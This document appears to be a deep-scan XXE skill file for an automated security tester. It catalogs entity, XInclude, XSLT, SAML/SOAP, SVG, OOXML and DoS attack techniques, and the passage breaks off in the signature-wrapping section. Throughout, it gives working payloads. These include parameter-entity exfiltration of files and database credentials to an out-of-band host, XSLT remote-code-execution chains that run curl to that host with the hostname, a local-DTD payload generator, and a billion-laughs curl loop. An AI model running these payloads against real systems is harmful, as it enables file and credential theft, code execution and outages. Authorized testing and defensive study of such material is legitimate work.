---
name: xxe-advanced-deep
description: XXE at advanced+expert depth — parameter-entity OOB exfiltration classes, XInclude/XSLT deep catalog with engine differentials, SOAP/SAML pre-signature parsing, SVG-to-renderer paths, egress-free multi-DTD extraction, entity-expansion DoS measured, content-type-switching matrix, and blind confirmation methodology.
sibling: xxe
load_when: scan_mode == "deep"
---

# XXE — Advanced Depth

This is the advanced+expert deep sibling to `xxe.md`. The base owns the class framing, measured parser-defaults, sink taxonomy, standard payload catalog, and chaining routes; the novel+frontier sibling `xxe_novel_deep.md` owns the 2024–2026 CVE frontier and current-frontier framing. This file owns the operational depth in between — parameter-entity OOB exfiltration deep, XInclude/XSLT full catalog with engine-specific behavior, SOAP/SAML pre-signature parsing, SVG-to-renderer paths, egress-free multi-DTD extraction, DoS measurement, content-type switching matrix, and blind confirmation methodology.

Load this file when the target is beyond a probe hit: the parser accepts DOCTYPE, but the response doesn't reflect entity content (blind), or the exposure is behind a WAF filtering `<!DOCTYPE>`, or the exploit path requires XInclude / XSLT / a specific renderer bug, or the sink is downstream of the request handler in a background pipeline.

Every version boundary, engine-specific behavior claim, and primary-source reference in this file has been verified against measured behavior or authoritative documentation. Measured behavior is marked with the environment; asserted behavior is marked as such.

## Parameter Entity OOB Depth

Parameter entities (`%name;`) are the exfiltration workhorse when the response doesn't reflect entity content. The class exploits the parser processing parameter entities in the internal DTD subset while general entities are sanitized in the XML tree.

**Canonical two-file pattern:**

Request:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://<oast>/x.dtd">
  %dtd;
]>
<r>&exfil;</r>
```

`x.dtd` on the attacker server:
```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY exfil SYSTEM 'http://<oast>/x?d=%f;'>">
%e;
```

Wire behavior:
1. Parser fetches `x.dtd` from OAST → OAST hit #1 (proves external-DTD resolution).
2. `x.dtd` defines `%f` (file:), `%e` (a general-entity definition constructing an exfil URL).
3. Parser expands `%e` → introduces `exfil` general entity whose SYSTEM URI includes `%f`'s value.
4. Parser resolves `&exfil;` in the document body → fetches the URL including the file content → OAST hit #2 with file content in the URL path/query.

**When `%f`'s content prevents URL construction (multi-line, non-URL-safe characters):**

Files with newlines break the URL: `%f` expands to the file's raw bytes, and inserting raw bytes into a URL construction fails (many parsers reject the invalid URI). Solutions in order of preference:

1. **URL-encode via chained resolution** — some parsers URL-encode entity references in URL construction; behavior varies per parser (measure).
2. **Use error-based extraction** — replace the HTTP-exfil with a broken URI that surfaces content in the parse error:
   ```xml
   <!ENTITY % err "<!ENTITY exfil SYSTEM 'file:///nonexistent/%f;'>">
   %err;
   ```
   The parse error message contains "file not found: /nonexistent/<file-content>" — the content lands in a diagnostic string. Requires the parser to surface parse errors in the HTTP response.
3. **Line-by-line extraction** — read files that fit in a URL: `/etc/hostname` (typically <64 bytes), `/etc/os-release` (first line), individual configuration values.
4. **`php://filter/convert.base64-encode/resource=...`** on PHP parsers — the base64-encoded output has no newlines or URL-unsafe characters, fits in a URL. Base file lists this wrapper.

**Multi-hop parameter-entity chains (chained OOB reads):**

Some parsers allow multiple parameter-entity chained expansions in a single DTD:

```xml
<!ENTITY % config SYSTEM "file:///var/www/config.xml">
%config;
<!ENTITY % dbcreds SYSTEM "file:///var/lib/mysql-creds/root.password">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://<oast>/?config=%config;&creds=%dbcreds;'>">
%send;
```

The parser reads `config.xml` first, expanding `%config`; then reads the DB credentials; then constructs a single exfil URL with both. Chain depth is parser-limited; libxml2 restricts to ~9 levels of nested entity expansion by default (adjust with `XML_PARSE_HUGE` — off by default).

**Parameter-entity in general-entity context (parser quirk):**

Some parsers permit `%` inside general-entity definitions:
```xml
<!ENTITY exfil "prefix-&exfil-suffix">
```
Rare but produces recursive expansion loops in specific parsers. Route to DoS section.

**Parser support for parameter entities in the internal subset:**

- libxml2 (Python `lxml`, PHP `DOMDocument`, Ruby Nokogiri opt-in) — parameter entities supported by default when DTD processing is enabled. libxml2 2.9+ requires explicit opt-in (`LIBXML_NOENT | LIBXML_DTDLOAD` in PHP, `resolve_entities=True, load_dtd=True` in lxml).
- Java `DocumentBuilderFactory` — parameter entities enabled by default in Xerces. `disallow-doctype-decl=true` blocks the DOCTYPE entirely, closing the parameter-entity surface as well.
- .NET `XmlReader` — parameter entities enabled when `DtdProcessing.Parse` is set explicitly; off by default in modern .NET.
- Python `xml.etree.ElementTree` — no parameter-entity support at all in stdlib; even with DTD processing enabled, ET does not implement parameter entities. `lxml` (libxml2 backend) does.
- Ruby REXML — no parameter-entity resolution in the modern REXML.

## XInclude Deep

XInclude (`http://www.w3.org/2001/XInclude`) is a separate transclusion mechanism from entity resolution. A parser can have entities disabled and XInclude enabled, so XInclude remains a live surface after XXE hardening.

**Canonical XInclude payload:**

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</r>
```

`parse="text"` includes the file as text (character content); `parse="xml"` includes as an XML tree, which requires the target file to be well-formed XML. `parse="text"` is universally useful for file disclosure.

**XInclude fallback:**

```xml
<xi:include href="file:///nonexistent">
  <xi:fallback>
    <xi:include href="file:///etc/passwd" parse="text"/>
  </xi:fallback>
</xi:include>
```

Fallback lets you probe multiple files in one request. If the first `href` doesn't resolve, the parser falls back to the second. Useful for exploring an unknown filesystem.

**XPointer within XInclude:**

```xml
<xi:include href="file:///var/www/config.xml" xpointer="//db/password/text()"/>
```

XPointer expressions select specific nodes from an XML file — surgical extraction rather than whole-file inclusion.

**XInclude with parameter substitution (some engines):**

Xerces supports `xi:include`'s `href` attribute referencing parameter entities:
```xml
<!ENTITY % fpath "file:///etc/passwd">
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="%fpath;" parse="text"/>
</r>
```

**Engine-specific XInclude support:**

- **Xerces (Java DBF/SAX/StAX)** — XInclude off by default; enable with `factory.setXIncludeAware(true)`. When on, all the above payloads work.
- **libxml2 (lxml, PHP, Nokogiri)** — XInclude off by default; enable with `parser.xinclude(target)` in lxml, `LIBXML_XINCLUDE` flag in PHP, `do_xinclude` in Nokogiri.
- **.NET** — no built-in XInclude support in `XmlReader`.
- **Python `xml.etree`** — no XInclude support.
- **Rails / Django** — depends on the underlying XML parser configuration.

**XInclude as an XXE hardening bypass:**

A code path that disables DOCTYPE processing but leaves XInclude enabled remains vulnerable. Common pattern: developer applies OWASP XXE guidance (`disallow-doctype-decl=true`, disable external entities) but doesn't disable `xincludeAware`. XInclude with `href="file://"` still works.

## XSLT Depth

XSLT is a Turing-complete XML transformation language. XSLT engines that accept user-influenced stylesheets or accept `document()` calls with user-influenced arguments provide read primitives; some engines with `xsl:script` or extension namespaces provide RCE.

**File read via `document()`:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

`document()` accepts URL forms — `file://`, `http://`, etc. The URL scheme decides reach.

**Read via `xsl:include` / `xsl:import`:**

```xml
<xsl:include href="file:///var/www/secret.xsl"/>
```

Includes another stylesheet; if the included file is not a valid stylesheet, some engines error with the file content in the error message.

**RCE via `xsl:script`:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt">
  <msxsl:script language="C#" implements-prefix="user">
    public string exec(string cmd) {
      System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
      return "";
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec('calc.exe')"/>
  </xsl:template>
</xsl:stylesheet>
```

This is the classic .NET `XslCompiledTransform` RCE — `xsl:script` executes when `XsltSettings.EnableScript = true` and `XmlResolver = new XmlUrlResolver()`. Both must be explicitly enabled; disabled by default in modern .NET.

**Java Xalan RCE via extension namespaces:**

Xalan-J (the historical Java XSLT engine, deprecated) supported `xalan://` extension namespaces:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="res" select="rt:exec($rt, 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

The `xalan://` namespace maps to Java class loading; any class in the classpath is instantiable. `java.lang.Runtime.exec` reaches shell exec.

**Modern Java XSLT — Saxon:**

Saxon-HE (open source) and Saxon-EE (commercial) — Saxon disables scripting by default. `saxon:extension` namespaces exist but are restricted; extension functions must be registered explicitly. The Saxon RCE surface is narrower than Xalan's; check the Saxon version and configuration.

**libxslt (Python lxml, PHP XSL, Perl):**

libxslt supports `sax:extension` and `exsl:*` extension functions:
```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:sax="http://icl.com/saxon"
    xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

`php:function` calls arbitrary PHP functions when the PHP extension enables it via `XSLTProcessor::registerPHPFunctions()`. This is an opt-in RCE surface in PHP XSLT.

**XSLT engine catalog with RCE-surface status:**

| Engine | `document()` file read | `xsl:script` RCE | Extension-namespace RCE |
|---|---|---|---|
| Xerces + Xalan-J (Java) | yes | yes (deprecated Xalan) | yes via `xalan://` |
| Saxon-HE / Saxon-EE (Java) | yes | disabled by default | opt-in extension functions |
| libxslt (Python lxml, PHP XSL) | yes | opt-in with `sax:script` | `php:function` requires `registerPHPFunctions` |
| .NET XslCompiledTransform | yes | opt-in `EnableScript = true` | via `XsltArgumentList` extension objects |
| .NET XslTransform (deprecated) | yes | yes (deprecated) | yes |
| Xalan-C++ | yes | via `xsl:script` | limited |

**Report-engine attack surface:**

XSLT is common in report engines. If a report template's XSLT is user-influenced (admin uploads a "custom report template"), the class fires:
- **JasperReports** — supports XSLT sub-reports; XSLT extension surface depends on library version.
- **BIRT** — supports XSLT transformations; similar shape.
- **Apache FOP** — takes XSL-FO input; the XSL-FO is XML processed with an XSLT-adjacent pipeline.
- **Crystal Reports** — XSLT-based export.
- **Saxon-CE** — client-side XSLT; browser-executed but same RCE surface for browser sandbox breaks (rare).

**Xalan-J chain construction depth:**

The canonical Xalan chain uses `java.lang.Runtime.getRuntime().exec()`. Practical construction across common Java targets:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
    xmlns:pb="http://xml.apache.org/xalan/java/java.lang.ProcessBuilder">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="cmd">
      <xsl:element name="s">sh</xsl:element>
      <xsl:element name="s">-c</xsl:element>
      <xsl:element name="s">curl http://&lt;oast&gt;/rce?h=$(hostname)</xsl:element>
    </xsl:variable>
    <xsl:variable name="proc" select="rt:exec($rt, $cmd)"/>
  </xsl:template>
</xsl:stylesheet>
```

The single-arg `Runtime.exec(String)` splits on whitespace naively, so multi-word commands need the array form. Use `ProcessBuilder` for reliable multi-arg execution.

**libxslt `saxon:evaluate` chain:**

When the target uses libxslt with Saxon extensions enabled:
```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:sax="http://icl.com/saxon">
  <xsl:template match="/">
    <xsl:copy-of select="sax:evaluate('system-property(&quot;os.name&quot;)')"/>
  </xsl:template>
</xsl:stylesheet>
```

Not universally RCE-capable (depends on the specific extension registrations), but the class is discoverable via probing.

## SOAP / SAML Pre-Signature Parsing

SOAP and SAML both use XML. The security-critical distinction is whether the parser processes the XML body (including entities, DOCTYPE) *before* the signature is verified or *after*.

**Pre-signature parsing is the class:**

Some ACS (Assertion Consumer Service) endpoints and some SOAP-processing WS-Security implementations parse the incoming XML — including entity expansion, DTD processing, and XInclude — before checking the signature. An attacker who cannot forge a signature but can influence the parsing gets XXE for free — the signature check runs on the original XML, but the parse already fired the entities.

**Vulnerable pattern:**

```
1. HTTP POST /acs (SAML endpoint)
   Body: <samlp:Response>...<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...&xxe;...</samlp:Response>
2. Server parses XML → resolves &xxe; → file bytes reach the parsed DOM
3. Server checks XML signature → invalid signature → rejects the response
4. But: step 2 already read the file. The parse-time side effects (OAST, error-based, in-response reflection if any) already fired.
```

**Detection methodology:**

- **Fingerprint the SAML implementation** — Shibboleth, SimpleSAMLphp, ADFS, OneLogin, SAML-toolkits for Ruby/Python/Java/.NET. Each has different pre-signature behavior; some hardened, some not.
- **Send an ACS request with a DOCTYPE and a signed assertion** — if the parse triggers OAST but the signature check rejects, the class is confirmed. Use a valid signature from a test IdP if you have one; otherwise craft an obviously-invalid signature that the server will reject *after* parsing.
- **Response shape** — a 400/403 rejection with OAST hit = pre-signature parsing confirmed. A 400/403 rejection with no OAST hit = signature checked first, XXE not reached.

**Historical SAML XXE CVEs:**

- CVE-2018-1000129, CVE-2018-1000130 — SimpleSAMLphp XXE variants.
- CVE-2019-3465 — CrushFTP SAML XXE.
- CVE-2019-10173 — Xstream + SAML related.
- Multiple product-specific CVEs across SAML libraries; verify per library and version.

**SOAP with WS-Security:**

- The WS-Security signature is a header inside the SOAP envelope. Some WS-Security implementations parse the entire envelope (including DTD if present) before verifying `wsse:Signature`.
- Signature-wrapping attacks compound the class: an attacker rearranges signed and unsigned XML nodes to trick the signature-verification into checking a different subtree than the one being processed.

**SOAP-body DOCTYPE payload:**

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>...<wsse:Signature>...</wsse:Signature></soap:Header>
  <soap:Body>
    <!DOCTYPE r [<!ENTITY x SYSTEM "http://<oast>/x">]>
    <r>&x;</r>
  </soap:Body>
</soap:Envelope>
```

Some SOAP stacks parse the envelope before checking the WS-Security signature. When they do, the DOCTYPE fires. When they don't, the signature check rejects the invalid signature before entity expansion runs.

## SVG-to-Renderer Paths

Server-side SVG rendering (SVG-to-PNG, SVG-to-PDF) is a common attack surface — the SVG is XML, and the renderer's XML parser decides the XXE surface.

**Rendering pipeline surfaces:**

- **Imagick / GraphicsMagick with SVG input** — `convert input.svg output.png`. Delegates to the underlying rasterizer (often librsvg or RSVG-based). The XML parser is libxml2 → PHP-defaults if under PHP; system-defaults elsewhere.
- **`librsvg`** — the reference SVG-to-raster library; uses libxml2 with entity resolution controlled by `--enable-external-entity-resolution` and similar options. Historically, librsvg accepted `file://` in `xlink:href` on `<image>` elements.
- **Apache Batik** — Java SVG library; uses `DocumentBuilderFactory` with default configuration unless the caller hardens.
- **Headless Chromium / Puppeteer / Playwright** — the browser processes SVG as part of the page. XXE-specific surfaces are limited (browsers restrict `file://` and cross-origin), but DOM-based XSS via SVG lives here (route to `xss.md` for the browser-side surface).
- **Inkscape server-side** — converts SVG to PNG/PDF; runs on desktop-equivalent XML parser.

**SVG-embedded DOCTYPE + external entity:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

When the renderer's XML parser resolves external entities and the rendered output includes the text of the SVG, the entity content lands in the rendered image (rasterized text). For PNG rendering, OCR the resulting image to extract the file content — some renderers even output the file bytes as visible text in the raster.

**SVG `<image xlink:href>`:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd" width="100" height="100"/>
</svg>
```

Some renderers fetch the `xlink:href` URL (treating it as an image source), and if the resulting bytes aren't a valid image, the renderer error surfaces the fetch. Confirmation shape: an error mentioning the file path is a partial disclosure.

**SVG in `<foreignObject>`:**

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <div xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="file:///etc/passwd"></iframe>
    </div>
  </foreignObject>
</svg>
```

`foreignObject` allows non-SVG XML (HTML) inside an SVG. Some renderers process the HTML including `<iframe>` — reaching file:// or arbitrary origins. Route DOM-based execution to `xss.md`; the traversal-specific expression lives here.

## Egress-Free Multi-DTD Depth

The base's egress-free block covers the GoSecure local-DTD technique. The advanced surface is the specific local-DTD catalog and the target-DTD-selection methodology when direct enumeration isn't possible.

**Local-DTD candidate catalog (must exist on the target's OS):**

- `/usr/share/xml/fontconfig/fonts.dtd` — Debian/Ubuntu fontconfig; redefine `%constant;`.
- `/usr/share/yelp/dtd/docbookx.dtd` — GNOME Yelp; redefine parameters DocBook references.
- `/usr/share/xml/schema/xml.dtd` — some Linux distros; redefine as documented.
- `/opt/jboss/wildfly/modules/system/layers/base/org/jboss/as/xml/main/schema/wildfly-core-*.xsd` — JBoss/WildFly; redefine schema parameters.
- `/opt/apache-tomcat-*/lib/servlet-api.jar` (JAR containing DTDs) — Java stacks; jar://-scheme extraction of internal DTDs.
- JDK's bundled `xml.xsd`, `datatypes.dtd` — Java stacks; located under `${java.home}/lib/`.

**Windows local-DTD candidates:**

- `C:\Windows\schemas\...` — bundled XML schemas.
- `C:\Program Files\Java\jre*\lib\xml.dtd` — bundled with JDK/JRE.
- Application-specific installations bring their own DTDs; enumerate per target.

**Target-DTD-selection when direct enumeration isn't possible:**

1. **Fingerprint the OS/distro** — HTTP server header, error page footer, X-Powered-By, or a previous read (`/etc/os-release`) if available. Distribution-specific DTDs live in distro-specific paths.
2. **Try the fontconfig DTD first** — `/usr/share/xml/fontconfig/fonts.dtd` is nearly universal on Linux desktops and many server distros; success rate is high.
3. **Match the parameter-entity name in your override to what the target DTD actually declares** — the base's example uses `%constant` because fontconfig declares that name. For a different DTD, read its source (public repositories) to find the parameter-entity names it declares internally.

**Local-DTD reuse extraction script generator:**

```python
def build_local_dtd_payload(local_dtd_path, target_file, override_entity_name):
    """Construct an XXE payload for egress-free extraction via local-DTD reuse."""
    return f'''<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file://{local_dtd_path}">
  <!ENTITY % {override_entity_name} 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file://{target_file}">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;err;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<r></r>'''
```

The `override_entity_name` must match a parameter-entity that the local DTD *actually references internally*. For fontconfig, that's `constant`. For DocBook, it's `x.list-attribute-set` or similar. Enumerate the local DTD's source to identify the exploitable override targets.

**Local-DTD reuse against Windows:**

Windows has fewer canonical local DTDs. `C:\Windows\schemas\` contains bundled schemas but they're usually XSD, not DTD. On Windows targets, the class is less reliable; consider whether the JVM/JRE installation directory has bundled DTDs from the JDK, which can be reached via `jar:file:///...`.

## Content-Type Switching Matrix

The base introduces the JSON-endpoint-with-XML-body-parser class. The advanced surface is the specific frameworks and their content-type-fallback behavior.

**Framework body-parser matrix:**

| Framework | Default parsers by request Content-Type | Fallback if header absent |
|---|---|---|
| Spring MVC with Jackson-XML + Jackson-JSON | `application/xml` → JAXB or Jackson-XML; `text/xml` → same; `application/json` → Jackson-JSON | JSON |
| Spring MVC classic | `application/xml` → JAXB or MarshallingHttpMessageConverter; `application/json` → Jackson | request-mapping-declared |
| ASP.NET Core | Input formatters — XML formatter when `[Consumes]` matches or in a Content-Type-matched route | JSON |
| Django REST Framework | Parser classes negotiate — `XMLParser` (django-rest-framework-xml) when Content-Type is xml | JSON |
| Rails | `application/xml` → `Hash.from_xml`; `application/json` → JSON parser | depends |
| Express with `body-parser-xml` | Registered per route; `application/xml` and `text/xml` when middleware is installed | depends on middleware order |
| FastAPI / Starlette | JSON-only unless XML parser explicitly installed | JSON |
| PHP `$_POST` | Not applicable; developer must call `simplexml_load_string($rawInput)` | manual |

**Content-Type variants to try:**

- `application/xml`
- `text/xml`
- `application/soap+xml`
- `application/*+xml` — some frameworks pattern-match on `+xml` suffix, so `application/vnd.custom+xml` reaches the XML parser.
- `application/xhtml+xml`
- `image/svg+xml` — sometimes routed to an XML parser rather than an image processor.

**Charset variants in Content-Type:**

- `application/xml; charset=UTF-8`
- `application/xml; charset=UTF-16` — with a UTF-16 BOM; some parsers switch encoding based on Content-Type charset while others switch based on the BOM. Divergence is a bypass surface.
- `application/xml; charset=US-ASCII` — same shape.

**Content-Type-switch against JSON endpoints:**

1. Request the endpoint normally with `Content-Type: application/json` and a JSON body; note the successful response shape.
2. Resend with `Content-Type: application/xml` and an XML body containing the same logical fields (e.g., `<request><param>value</param></request>` instead of `{"param":"value"}`).
3. If the response is comparable (indicates successful parse and processing), the XML parser is live. Escalate with DOCTYPE + entity payloads.
4. If the response is a 415 Unsupported Media Type or a parse error unrelated to XXE, the endpoint doesn't consume XML — try the other Content-Type variants above.

**Chained content-type switch:**

Some frameworks accept a Content-Type on an inner part of a multipart body (each part has its own Content-Type header). A `multipart/form-data` body with one part having `Content-Type: application/xml` may route that part to the XML parser even when the outer request is `application/x-www-form-urlencoded`.

## Blind Confirmation Methodology

The base's Confirmation Discipline section covers the finding-vs-signal distinction. The advanced surface is the operational methodology for confirming XXE when direct oracles are unavailable.

**When DNS-only OAST fires but HTTP doesn't:**

- The parser resolved the hostname (called `getaddrinfo`) but didn't complete the fetch. This can mean: (a) the parser validates URIs by resolving the host but doesn't actually fetch; (b) an egress firewall blocks HTTP but allows DNS; (c) the parser fetched but the HTTP layer rejected the response (invalid content-type expected, non-200 status).
- Try a different scheme: `ftp://` (may bypass HTTP-specific firewall rules); `gopher://` (unusual, may leak); `https://` (may pass HTTPS-only egress).
- Try an HTTP endpoint with a valid content-type for XML: many parsers only fetch external DTDs with an XML content-type on the response.

**When neither DNS nor HTTP fires but the parser accepts DOCTYPE:**

- The parser processes the DOCTYPE but doesn't resolve external URIs. Test internal-only entity resolution (`<!ENTITY t "MARKER">`) — if that works but external URIs don't, the parser has external-entity-resolution disabled but general-entity expansion enabled. Report as "partial parser hardening."
- Test XInclude — a separate switch that may still be on: `<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://<oast>/x"/></r>`.
- Test XSLT — if the endpoint accepts stylesheet uploads or transformation requests.

**When only error-based reflection is available:**

- A payload that produces a parse error whose message includes fetched content is the disclosure vector.
- `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///nonexistent/<known-file>">]>` — the file-not-found error may include the resolved path.
- More reliable: local-DTD reuse (Egress-Free Multi-DTD Depth section above) surfaces file content in a parse error even without HTTP egress.

**Error-shape delta for boolean confirmation:**

Even when no content leaks, the response *shape* may distinguish two states:
- Payload A: `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` — resolvable file.
- Payload B: `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///nonexistent">]><r>&x;</r>` — non-existent file.

Different response codes (200 vs 500), different response times, different error page shapes: any two-state divergence is a boolean oracle. Iterate the payload's file target to enumerate what exists.

**Timing-based confirmation:**

Fetching a large file (`/var/log/apache2/access.log`, potentially many MB) takes measurably longer than fetching a small file (`/etc/hostname`, ~10 bytes). If neither direct-reflection nor OAST works but timing varies with the target file, the parser is fetching the file (confirmation of entity resolution) even if the content doesn't reach the response.

## Cross-Parser Differentials

The same XML payload can behave differently across parsers on the same target if the target uses multiple parsers for different endpoints or code paths. Fingerprint the specific parser at each endpoint separately.

**Parser fingerprinting probes:**

- **DOCTYPE with an obviously-invalid character**: `<!DOCTYPE r [<!ENTITY x "&#invalid;">]>` — different parsers surface different error shapes.
- **Encoding declaration mismatch**: XML declared as `encoding="UTF-16"` sent as UTF-8 bytes — some parsers auto-detect and adjust, others fail with distinguishable errors.
- **Whitespace between DOCTYPE and root element**: XML spec allows whitespace, but strict parsers reject; permissive parsers accept.
- **Invalid entity reference**: `<!ENTITY x "&nonexistent;">` — different parsers produce different error messages and different response shapes.
- **XInclude namespace variant**: `xmlns:xi="http://www.w3.org/2001/XInclude"` vs `xmlns:xi="http://www.w3.org/2004/XInclude"` — the 2001 version is standard; the 2004 draft was never finalized; parsers that accept the 2004 form are unusual.

**Same-target multi-parser example:**

- Endpoint A (`/api/soap`) uses Java Axis2 with Xerces default → XXE-live.
- Endpoint B (`/api/rest`) uses Jackson-XML with hardened defaults → not vulnerable.
- Endpoint C (`/api/upload/svg`) uses ImageMagick with librsvg → librsvg's parser behavior.

Same target, three different parsers, three different XXE postures. Test each independently.

## OOXML / OpenDocument Repackaging Attacks

DOCX, XLSX, PPTX, ODT are ZIP archives containing XML files. Modifying the XML inside and repackaging produces an attack payload for any consumer that parses the internal XML.

**DOCX payload construction:**

1. Take a benign `template.docx` (any Word document).
2. `unzip template.docx -d template/` — extracts to a directory tree.
3. Modify `template/word/document.xml` to include a DOCTYPE + entity payload at the top:
   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
   <!DOCTYPE w:document [
     <!ENTITY xxe SYSTEM "http://<oast>/x">
   ]>
   <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" ...>
     <w:body>
       <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
     </w:body>
   </w:document>
   ```
4. `cd template && zip -r ../payload.docx .` — repackages.
5. Upload `payload.docx` to the target. If the target's DOCX processor parses the XML with XXE enabled, the entity fires.

**Target DOCX consumers:**

- Server-side conversion services (LibreOffice-headless, unoconv, Aspose, ONLYOFFICE) — some hardened, some not.
- Preview / thumbnail generation — extract the XML, render a snippet.
- Metadata extraction — read `docProps/app.xml`, `docProps/core.xml` for author/title; XML parsed.
- Full-text search indexing — extracts document text via XML parse.

**XLSX-specific attack:**

XLSX has multiple XML files: `xl/workbook.xml`, `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml`, etc. Any of them can carry a DOCTYPE payload.

**ODT (OpenDocument Text):**

ODT is similar — `content.xml`, `styles.xml`, `meta.xml` inside a ZIP.

## Entity-Expansion DoS — Measured

The base introduces billion-laughs (exponential) and quadratic blowup. The advanced surface is the parser-specific caps and the specific payload shapes that survive them.

**Billion laughs — exponential:**

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<r>&lol9;</r>
```

10 nested definitions, each expanding 10x → total expansion 10^9 chars = 1 GB. Memory exhaustion.

**Parser caps (documented, not measured — verify per version):**
- **libxml2** — `XML_PARSE_HUGE` flag off by default; hard-caps entity expansion count at ~10^7. Billion laughs hits the cap and rejects.
- **Java Xerces** — `entityExpansionLimit` system property, default 64000; blocks billion laughs.
- **.NET `XmlReader`** — `MaxCharactersFromEntities` property; default 10^7 characters.
- **Python `xml.etree`** — no built-in limit but Python's memory allocation fails long before 1 GB in typical configurations.
- **`defusedxml`** — Python — rejects DOCTYPE outright; billion laughs cannot even parse.

**Quadratic blowup — evades exponential caps:**

```xml
<!DOCTYPE r [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaa...">  <!-- ~100 KB of 'a' -->
]>
<r>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;... (10000 times)</r>
```

Entity count is 10001 (one definition + 10000 references) — under most caps. Total expanded size: 10000 × 100 KB = 1 GB. Memory exhaustion without triggering exponential-count guards.

**XXE-with-cycles (some parsers):**

```xml
<!DOCTYPE r [
  <!ENTITY a "b: &b;">
  <!ENTITY b "a: &a;">
]>
<r>&a;</r>
```

Circular entity reference. Modern parsers detect the cycle and reject — but some legacy parsers loop until memory exhaustion. Fingerprint before running against production.

**Measurement guidance (only run in DoS-authorized scope with hard ceilings):**

```bash
# Send a 10x-scaling billion-laughs and measure response time / memory pressure
# Progressively scale from lol1 (100 chars) → lol9 (1 GB) with response-time gate
for depth in 1 2 3 4 5 6 7 8 9; do
  payload=$(python3 -c "print('<!DOCTYPE lolz [' + ''.join(f'<!ENTITY lol{i} \"' + '&lol' + str(i-1) + ';' * 10 + '\">' for i in range(1, ${depth}+1))+ ']><r>&lol${depth};</r>')")
  time curl -X POST 'https://target/api/xml' -H 'Content-Type: application/xml' --data "$payload" -o /dev/null
done
```

Do not exceed the target's resource limits — a real DoS payload kills production. Testing at authorized-scope-only.

## XML Signature-Wrapping Chains

SAML pre-signature parsing (§ SOAP / SAML Pre-Signature Parsing) is one class. Signature-wrapping is a distinct class that compounds with it — the signature-verification code checks a different XML tree than the processing code uses.

**Class shape:**

A SAML response contains:
```xml
<samlp:Response>
  <ds:Signature>
    <ds:Reference URI="#assertion-1"/>  <!-- signature covers assertion-1 -->
  </ds:Signature>
  <Assertion ID="assertion-1">
    <Subject>victim@example.com</Subject>
  </Assertion>
</samlp:Response>
```

Attacker modifies to:
```xml
<samlp:Response>
  <ds:Signature>
    <ds:Reference URI="#assertion-1"/>
  </ds:Signature>
  <Assertion ID="assertion-1">
    <Subject>victim@example.com</Subject>  <!-- signature still valid -->
  </Assertion>
  <Assertion ID="assertion-2">   <!-- attacker-added -->
